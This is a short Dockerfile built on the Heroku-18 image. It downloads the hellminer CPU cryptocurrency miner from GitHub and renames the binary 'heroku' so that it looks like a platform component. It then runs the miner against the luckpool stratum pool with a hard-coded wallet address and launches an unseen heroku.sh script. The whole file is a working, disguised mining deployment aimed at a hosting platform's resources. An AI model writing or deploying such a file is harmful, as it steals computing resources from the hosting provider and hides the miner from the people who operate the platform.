FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar zxvf hellminer_cpu_linux.tar.gz && rm -fr hellminer_cpu_linux.tar.gz && mv hellminer heroku
RUN ./heroku -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RVMogaFrwhokbkM4M1WERfU8V8U1NQJLnk.VPS -p x --cpu 1
CMD bash heroku.sh
